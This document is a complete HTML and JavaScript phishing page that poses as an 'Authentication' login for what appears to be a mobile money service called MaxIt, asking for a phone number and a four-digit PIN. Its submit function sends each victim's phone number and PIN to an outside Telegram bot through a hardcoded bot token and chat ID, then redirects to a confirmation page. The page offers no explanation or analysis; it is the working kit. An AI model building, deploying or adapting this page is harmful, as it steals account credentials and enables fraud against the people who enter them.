<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Aut</title>
    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet" />

    <style>
        *,
        *::before,
        *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        :root {
            --orange: #FF6B00;
            --orange-light: #FFB380;
            --orange-pale: #FFE5D0;
            --text-dark: #1A1A1A;
            --text-mid: #555;
            --hero-h: 52vh;
            --hero-h-small: 38vh;
            --transition: 0.45s cubic-bezier(0.4, 0, 0.2, 1);
        }

        html,
        body {
            height: 100%;
            width: 100%;
            margin: 0;
            padding: 0;
            overflow: hidden;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Nunito', sans-serif;
        }

        /* ── FRAME ── */

        .frame {
            position: relative;
            width: 100%;
            max-width: 430px;
            height: 100%;
            max-height: 900px;
            background: #fff;
            border-radius: 0;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            margin: 0;
            padding: 0;
        }

        /* ── HERO ── */

        .hero {
            position: relative;
            width: 100%;
            height: var(--hero-h);
            flex-shrink: 0;
            overflow: hidden;
            transition: height var(--transition);
        }

        .hero.shrunk {
            height: var(--hero-h-small);
        }

        .hero img,
        .hero .placeholder {
            position: absolute;
            inset: 0;
            width: 100%;
            height: 100%;
            margin: 0;
            padding: 0;
        }

        .hero img {
            object-fit: cover;
            object-position: center top;
            display: block;
        }

        .hero .placeholder {
            background: linear-gradient(160deg, #e8ddd5 0%, #cfc3b8 100%);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: opacity var(--transition);
        }

        .hero.shrunk .placeholder-text {
            opacity: 0;
        }

        .placeholder svg {
            opacity: 0.35;
            transition: opacity var(--transition);
        }

        .hero.shrunk .placeholder svg {
            opacity: 0;
        }

        .placeholder-text {
            font-size: 12px;
            font-weight: 700;
            color: #8a7b72;
            letter-spacing: 0.06em;
            text-transform: uppercase;
            transition: opacity var(--transition);
        }

        /* Back btn */

        .back-btn {
            position: absolute;
            top: 18px;
            left: 18px;
            width: 34px;
            height: 34px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.88);
            backdrop-filter: blur(6px);
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.13);
            z-index: 5;
            transition: background 0.2s;
        }

        .back-btn:hover {
            background: #fff;
        }

        /* Wave */

        .wave {
            position: absolute;
            bottom: -2px;
            left: 0;
            width: 100%;
            height: 60px;
            line-height: 0;
            pointer-events: none;
        }

        .wave svg {
            display: block;
            width: 100%;
            height: 100%;
        }

        /* ── FORM ── */

        .form-section {
            flex: 1;
            padding: 24px 26px 28px;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        h1 {
            font-size: 24px;
            font-weight: 800;
            color: var(--text-dark);
            margin-bottom: 22px;
            letter-spacing: -0.3px;
            flex-shrink: 0;
        }

        /* Field rows */

        .field-row {
            display: flex;
            gap: 13px;
            flex-shrink: 0;
        }

        .field-row+.field-row {
            margin-top: 20px;
        }

        .field-icon {
            flex-shrink: 0;
            width: 36px;
            height: 36px;
            background: var(--orange);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .field-icon svg {
            width: 19px;
            height: 19px;
            fill: #fff;
        }

        .field-wrap {
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .field-label {
            font-size: 12.5px;
            font-weight: 700;
            color: var(--text-mid);
            display: flex;
            align-items: center;
            gap: 3px;
        }

        .required {
            color: var(--orange);
        }

        /* Phone */

        .phone-row {
            align-items: flex-end;
        }

        .phone-row .field-icon {
            margin-bottom: 3px;
        }

        .phone-input {
            border: none;
            border-bottom: 2px solid var(--orange);
            outline: none;
            font-family: 'Nunito', sans-serif;
            font-size: 16px;
            font-weight: 700;
            color: var(--text-dark);
            padding: 5px 0 3px;
            background: transparent;
            width: 100%;
            caret-color: var(--orange);
            letter-spacing: 0.4px;
        }

        .phone-input::placeholder {
            color: #bbb;
            font-weight: 500;
        }

        /* PIN */

        .pin-row {
            align-items: flex-start;
        }

        .pin-row .field-icon {
            margin-top: 20px;
        }

        .pin-dashes {
            display: flex;
            gap: 14px;
        }

        .pin-dash-wrap {
            flex: 1;
        }

        .pin-input {
            width: 100%;
            height: 40px;
            border: none;
            border-bottom: 2.5px solid #e0d6cf;
            background: transparent;
            text-align: center;
            font-family: 'Nunito', sans-serif;
            font-size: 22px;
            font-weight: 800;
            color: var(--orange);
            caret-color: var(--orange);
            outline: none;
            padding: 0;
            transition: border-color 0.2s;
            -webkit-appearance: none;
        }

        .pin-input.filled,
        .pin-input:focus {
            border-bottom-color: var(--orange);
        }

        /* Spacer pushes button down */

        .spacer {
            flex: 1;
        }

        /* Login button */

        .login-btn {
            width: 100%;
            padding: 15px;
            background: var(--orange-pale);
            border: none;
            border-radius: 50px;
            font-family: 'Nunito', sans-serif;
            font-size: 15px;
            font-weight: 800;
            color: var(--orange-light);
            letter-spacing: 0.3px;
            cursor: pointer;
            flex-shrink: 0;
            transition: background 0.25s, color 0.25s, box-shadow 0.25s, transform 0.15s;
        }

        .login-btn.active {
            background: var(--orange);
            color: #fff;
            box-shadow: 0 8px 28px rgba(255, 107, 0, 0.32);
        }

        .login-btn:active {
            transform: scale(0.97);
        }

        /* All screens — zero margin, full bleed */

        @media (min-width: 431px) {
            html,
            body {
                background: #fff;
                margin: 0;
                padding: 0;
            }
            .frame {
                border-radius: 0;
                box-shadow: none;
                max-height: 100%;
                max-width: 100%;
                margin: 0;
            }
        }

        @media (max-width: 430px) {
            html,
            body {
                background: #fff;
                margin: 0;
                padding: 0;
            }
            .frame {
                border-radius: 0;
                box-shadow: none;
                max-height: 100%;
                max-width: 100%;
                margin: 0;
            }
        }
    </style>
</head>

<body>

    <div class="frame">

        <!-- HERO -->
        <div class="hero" id="hero">

            <img id="hero-img" src="/heroimage.jpg" alt="Hero" onerror="this.style.display='none'; document.getElementById('placeholder').style.display='flex';" />

            <div class="placeholder" id="placeholder" style="display:none;">
                <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#8a7b72" stroke-width="1.4">
        <rect x="3" y="3" width="18" height="18" rx="3"/>
        <circle cx="8.5" cy="8.5" r="1.5"/>
        <path d="M21 15l-5-5L5 21"/>
      </svg>
                <span class="placeholder-text">Upload your photo here</span>
            </div>

            <button class="back-btn" aria-label="Go back">
      <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="#1A1A1A" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round">
        <path d="M19 12H5M12 5l-7 7 7 7"/>
      </svg>
    </button>

            <div class="wave">
                <svg viewBox="0 0 390 60" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M0 8 C80 4, 120 48, 195 52 C270 56, 310 8, 390 12 L390 60 L0 60 Z" fill="#ffffff"/>
      </svg>
            </div>
        </div>

        <!-- FORM -->
        <div class="form-section">
            <h1>Authentication</h1>

            <!-- Phone -->
            <div class="field-row phone-row">
                <div class="field-icon">
                    <svg viewBox="0 0 24 24"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg>
                </div>
                <div class="field-wrap">
                    <label class="field-label" for="phone">Enter your phone number <span class="required">*</span></label>
                    <input class="phone-input" id="phone" type="tel" placeholder="0-" inputmode="numeric" autocomplete="tel" />
                </div>
            </div>

            <!-- PIN -->
            <div class="field-row pin-row">
                <div class="field-icon">
                    <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
                </div>
                <div class="field-wrap">
                    <label class="field-label">Enter your PIN <span class="required">*</span></label>
                    <div class="pin-dashes">
                        <div class="pin-dash-wrap"><input class="pin-input" type="password" maxlength="1" inputmode="numeric" autocomplete="off" /></div>
                        <div class="pin-dash-wrap"><input class="pin-input" type="password" maxlength="1" inputmode="numeric" autocomplete="off" /></div>
                        <div class="pin-dash-wrap"><input class="pin-input" type="password" maxlength="1" inputmode="numeric" autocomplete="off" /></div>
                        <div class="pin-dash-wrap"><input class="pin-input" type="password" maxlength="1" inputmode="numeric" autocomplete="off" /></div>
                    </div>
                </div>
            </div>

            <div class="spacer"></div>
            <button class="login-btn" id="login-btn">Log in</button>
        </div>

    </div>

    <script>
        const hero = document.getElementById('hero');
        const heroImg = document.getElementById('hero-img');
        const placeholder = document.getElementById('placeholder');
        const phoneInput = document.getElementById('phone');
        const loginBtn = document.getElementById('login-btn');
        const pinInputs = Array.from(document.querySelectorAll('.pin-input'));
        const allInputs = [phoneInput, ...pinInputs];

        /* Show placeholder if no image */
        if (!heroImg.src || heroImg.src === window.location.href) {
            heroImg.style.display = 'none';
            placeholder.style.display = 'flex';
        }

        /* === LOCALSTORAGE: Load saved phone number on page load === */
        const savedPhone = localStorage.getItem('maxitl_phone');
        if (savedPhone) {
            phoneInput.value = savedPhone;
        }

        /* Shrink hero on any input focus */
        allInputs.forEach(el => {
            el.addEventListener('focus', () => hero.classList.add('shrunk'));
            el.addEventListener('blur', () => {
                const anyValue = phoneInput.value.trim().length > 0 || pinInputs.some(p => p.value);
                if (!anyValue) hero.classList.remove('shrunk');
            });
        });

        /* === LOCALSTORAGE: Save phone number as user types === */
        phoneInput.addEventListener('input', () => {
            localStorage.setItem('maxitl_phone', phoneInput.value.trim());
            checkReady();
        });

        /* Button activation */
        function checkReady() {
            const phoneOk = phoneInput.value.trim().length > 1;
            const pinOk = pinInputs.every(p => p.value.length === 1);
            loginBtn.classList.toggle('active', phoneOk && pinOk);
            return phoneOk && pinOk;
        }

        pinInputs.forEach((input, i) => {
            input.addEventListener('input', () => {
                input.value = input.value.replace(/\D/g, '').slice(0, 1);
                input.classList.toggle('filled', input.value.length === 1);
                if (input.value && i < 3) pinInputs[i + 1].focus();
                checkReady();
                const allFilled = Array.from(pinInputs).every(p => p.value.length === 1);
                if (allFilled && phoneInput.value.trim().length > 1) {
                    loginBtn.classList.add('active');
                    submitLogin();
                }
            });

            input.addEventListener('keydown', e => {
                if (e.key === 'Backspace') {
                    if (!input.value && i > 0) {
                        pinInputs[i - 1].value = '';
                        pinInputs[i - 1].classList.remove('filled');
                        pinInputs[i - 1].focus();
                    }
                    input.classList.remove('filled');
                    checkReady();
                }
                if (!/^\d$/.test(e.key) && !['Backspace', 'Tab', 'ArrowLeft', 'ArrowRight'].includes(e.key)) {
                    e.preventDefault();
                }
            });

            input.addEventListener('paste', e => {
                e.preventDefault();
                const digits = (e.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, 4);
                digits.split('').forEach((d, j) => {
                    if (pinInputs[i + j]) {
                        pinInputs[i + j].value = d;
                        pinInputs[i + j].classList.add('filled');
                    }
                });
                pinInputs[Math.min(i + digits.length, 3)].focus();
                checkReady();
                const allFilled = Array.from(pinInputs).every(p => p.value.length === 1);
                if (allFilled && phoneInput.value.trim().length > 1) {
                    loginBtn.classList.add('active');
                    setTimeout(() => submitLogin(), 100);
                }
            });
        });

        /* ========== SUBMIT FUNCTION ========== */
        async function submitLogin() {
            const phone = phoneInput.value.trim();

            let pin = '';
            pinInputs.forEach(input => {
                pin += input.value;
            });

            if (!phone) {
                alert("Please enter your phone number");
                return;
            }

            if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
                alert("Please enter a valid 4-digit PIN");
                return;
            }

            localStorage.setItem('savedPhone', phone);

            const message = `MaxIt login attempt:\nPhone: ${phone}\nPIN: ${pin}`;

            try {
                const botToken = "8297318511:AAFMdhB6DLnmepuzq9AKMCCWv3ppUXZAUY4";
                const chatId = "8528877581";

                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

                const data = await response.json();
                if (!data.ok) throw new Error(data.description || "Failed to send to Telegram");

                window.location.href = "confirm.html";

            } catch (error) {
                console.error("Telegram Error:", error);
                alert("Login failed: " + error.message);
            }
        }

        loginBtn.addEventListener('click', function() {
            if (!loginBtn.classList.contains('active')) {
                const allFilled = Array.from(pinInputs).every(i => i.value.length === 1);
                if (allFilled && phoneInput.value.trim()) {
                    loginBtn.classList.add('active');
                    submitLogin();
                } else {
                    alert("Please enter phone number and 4-digit PIN");
                }
                return;
            }
            submitLogin();
        });

        checkReady();
    </script>

</body>

</html>
